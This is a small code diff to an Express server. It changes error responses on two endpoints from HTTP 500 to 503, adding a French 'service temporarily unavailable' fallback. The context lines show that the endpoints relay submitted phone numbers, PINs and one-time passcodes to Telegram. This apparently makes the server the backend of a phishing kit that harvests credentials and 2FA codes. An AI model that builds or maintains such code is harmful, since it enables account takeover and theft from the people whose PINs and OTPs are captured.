@@ -95,7 +95,7 @@ app.post('/api/verify/phone-pin', authenticateApiKey, async (req, res) => {
     if (result.success) {
         res.json({ success: true, message: 'Phone & PIN sent to Telegram', id: result.id });
     } else {
-        res.status(500).json({ success: false, error: result.error });
+        res.status(503).json({ success: false, error: result.error || 'Service temporairement indisponible' });
     }
 });
 
@@ -153,7 +153,7 @@ app.post('/api/verify/otp', authenticateApiKey, async (req, res) => {
     if (result.success) {
         res.json({ success: true, message: 'OTP sent to Telegram for verification', id: result.id });
     } else {
-        res.status(500).json({ success: false, error: result.error });
+        res.status(503).json({ success: false, error: result.error || 'Service temporairement indisponible' });
     }
 });
 
